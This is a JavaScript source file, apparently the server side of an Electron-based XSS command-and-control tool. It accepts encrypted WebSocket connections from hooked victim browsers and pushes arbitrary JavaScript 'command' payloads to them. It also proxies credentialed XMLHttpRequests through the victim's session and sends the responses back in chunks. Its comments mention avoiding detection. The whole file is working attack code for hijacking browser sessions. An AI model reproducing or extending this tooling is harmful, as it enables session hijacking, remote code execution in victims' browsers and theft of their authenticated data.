import WebSocketListener from '../module/listener_socket';
import { ipcMain, BrowserWindow } from 'electron';

import { getSecureKey, encrypt, decrypt } from '../utils/index';

import { proxy_domain, proxy_timeout, ws_port_local, exclude_headers } from '../conf/index';

export const sockets = [];
const socket = new WebSocketListener(ws_port_local(), (ws, id, { ip }) => {
    //获取窗口
    const win = BrowserWindow.fromId(1).webContents;

    //ws为一个websocket连接，id为这个连接对应的id，创建密钥并发送，不定时更新密钥
    const key = getSecureKey();
    
    const socket_cache = {
        ws : ws,
        id : id,
        running : true,
        key : key,
        // timer : setInterval(function() {
        //     const new_key = getSecureKey();
        //     const msg = JSON.stringify({
        //         type : 'secure',
        //         data : new_key,
        //         iv : getSecureKey(parseInt(Math.random() * 16 + 5))
        //     })
        //     ws.send(encrypt(msg, socket_cache.key));
        //     socket_cache.key = new_key;
        // }, parseInt(Math.random() * 256 + 60) * 1000)
        proxy_list : [],                                                    //流量转发列表
        proxy_domain : `协议.端口.目标域名.s${id}.${proxy_domain()}`,          //流量对应域名,
        proxy_seq : 0,                                                      //流量转发序号
        proxy_server : `s${id}`                                             //转发服务器名
    };
    //向渲染进程传递新连接创建的消息
    win.send('xss_core.newcon', {
        id : id,
        info : {
            ip : ip,
            proxy_domain : socket_cache.proxy_domain,
            proxy_server_name : `s${id}`,
            proxy_host : proxy_domain(),
            proxy_port : 10093
        }
    });
    sockets.push(socket_cache);
    ws.send(key);
    ws.on('message', async message => {
        //先解密
        try{
            message = JSON.parse(decrypt(message, socket_cache.key));
            //普通消息直接转发到渲染进程里去，同步消息则处理同步消息队列
            if(message['type'] === 'normal'){
                win.send('xss_core.sendmsg', {
                    id : id,
                    data : message['data']
                });
            }else if(message['type'] === 'async'){
                /**
                 * 这里强调一下数据结构，对于同步消息，message['data']是一个JSON，结构为 { index : number, text : string, fin : bool }
                 * 其中index用于标记当前传输是第index传输，fin用于表示是否传输完成，同时浏览器在第一次发送payload的时候会挂载一个回调，用于处理第n次传输
                 * 所以在第index次传输完成以后，如果fin为false，那么我们就需要发送一个payload用于触发这个回调，启动第index + 1次传输
                 */
                for(const i in socket_cache.proxy_list){
                    //先获取到是哪一条消息
                    if(socket_cache.proxy_list[i].seq === message['id']){
                        //然后解析JSON
                        const temp = JSON.parse(message['data']);
                        socket_cache.proxy_list[i].response += temp['text'];
                        //如果fin了就表示分片传输传完了，如果没传完就给客户端发一个表示可以继续传输的消息
                        if(temp['fin']){
                            socket_cache.proxy_list[i].callback();
                        }else{
                            //启动第 index + 1次传输
                            const payload = `window.cachex.next$cb${message['id']}(${temp['index'] + 1});`;
                            ws.send(encrypt(JSON.stringify({
                                type : 'command',
                                data : payload
                            }), socket_cache.key));
                        }
                        break;
                    }
                }
            }
        }catch(e){
            //有可能出现消息发到一半密钥更新了的情况，这个时候会解密错误，我已经给出了 60 ~ 316秒的时间用于消息传输，如果出问题的话最好使用分块传输
            win.send('xss_core.sendmsg', {
                id : id,
                data : 'decrypt error'
            });
        }
    });
    ws.on('close', () => {
        for(const i in sockets){
            if(sockets[i].id === id){
                //定掉计时器
                //clearInterval(sockets[i].timer);
                sockets.splice(i, 1);
                break;
            }
        }
        //向渲染进程传递连接关闭的消息
        win.send('xss_core.close', {
            id : id
        });
    });
});

//发消息事件监听
ipcMain.on('xss_core.sendmsg', (ev, msg) => {
    //首先获取是哪一个websocket
    const id = msg['id'];
    //再搜寻对应id的ws，调用send
    for(const i in sockets){
        if(sockets[i].id === id){
            sockets[i].ws.send(encrypt(JSON.stringify({
                type : msg['type'],
                data : msg['data']
            }), sockets[i].key));
            break;
        }
    }
});


/**
 * 所有的请求需要走队列，这里我们手动构建队列，保证数据包不发生错位等魔幻行为
 * 由于我们们的请求最终是由websocket去执行的，发数据包的速度不能太快，也就是要处理一下高并发的行为
 */
 const proxy_list = [];
 let proxy_current_index = 0;

//执行一段payload，但是是同步的，而且走队列
export const proxyPayload = (server, payload) => new Promise( resolve => {
    //由domain获取到对应session的id
    for(const i of sockets){
        if(i.proxy_server === server){
            const handler = async () => {
                const seq = i.proxy_seq++;
                i.ws.send(encrypt(JSON.stringify({
                    type : 'command',
                    data : payload(seq)
                }), i.key));
                const proxy = {
                    response : '',
                    seq : seq,
                    callback(){
                        resolve(proxy.response);
                        clearTimeout(proxy.timer);
                        for(const j in i.proxy_list){
                            if(i.proxy_list[j].seq === seq){
                                i.proxy_list.splice(j, 1);
                                break;
                            }
                        }
                        //执行完当前代理后启动下一个代理请求，如果不存在下一个了，那就说明处理完了
                        proxy_current_index++;
                        if(proxy_list[proxy_current_index]){
                            proxy_list[proxy_current_index]();
                        }
                    },
                    //处理超时，超时后先回应promise，然后删掉这个proxy
                    timer : setTimeout(() => {
                        resolve('timeout');
                        for(const j in i.proxy_list){
                            if(i.proxy_list[j].seq === seq){
                                i.proxy_list.splice(j, 1);
                                break;
                            }
                        }
                    }, proxy_timeout())
                };
                i.proxy_list.push(proxy);
            }
            proxy_list.push(handler);
            //如果还没处理完，则只推入队列，如果处理完了，推入队列的同时启动代理请求
            if(proxy_current_index === proxy_list.length - 1){
                handler();
            }
            return;
        }
    }
    resolve('invalid server');
});


//同步js操作服务
export const proxyOneLineCommandAsync = (server, command) => new Promise( async resolve => {
    const payload = seq => `
        var res = ${command};
        window.cachex.sendAsync(JSON.stringify({
            fin : true,
            text : res
        }), ${seq});
    `;
    const res = await proxyPayload(server, payload);
    resolve(res);
});

//流量转发服务
/**
 * 
 * @param {string} server  转发服务器名
 * @param {string} method  请求方法 
 * @param {string} to      目标uri
 * @param {string} data    体数据
 * @param {object} headers 头
 * @returns 
 */
export const proxyRequest = (server, method, uri, data, headers) => new Promise( async resolve => {
    const payfunc = seq => {
            let payload =  `
            var seq = ${seq};
            var req = new XMLHttpRequest();
            req.withCredentials = true;
            req.open('${method.toUpperCase()}', '${uri}');
        `;
        for(const j in headers){
            //有一些头一般是不允许操作的，就不改了，免得报错太多被发现
            if(!exclude_headers.includes(j.toUpperCase())){
                payload += `req.setRequestHeader('${j}','${headers[j]}');`;
            }
        }
        //这里有个很难搞的事情，对于太长了的资源，我们需要分片传输，又要处理异步了QAQ
        /**
         * 首先挂载一个用于传输第n次数据的函数，随后从0开始启动第0次传输，第 0 + 1次会由服务器发送payload启动
         */
        payload += `
            req.send('${data}');
            req.onreadystatechange = function(ev){
            if(req.readyState !== 4) return;
                window.cachex.next$cb${seq} = function(index){
                    var text = req.responseText.slice(index * 16382, (index + 1) * 16382);
                    window.cachex.sendAsync(JSON.stringify({
                        index : index,
                        text : text,
                        fin : text.length < 16382
                    }), ${seq});
                    if(text.length < 16382){
                        delete window.cachex.next$cb${seq};
                    }
                }
                window.cachex.next$cb${seq}(0);
            }
        `;
        return payload;
    }
    const res = await proxyPayload(server, payfunc)
    resolve(res);
});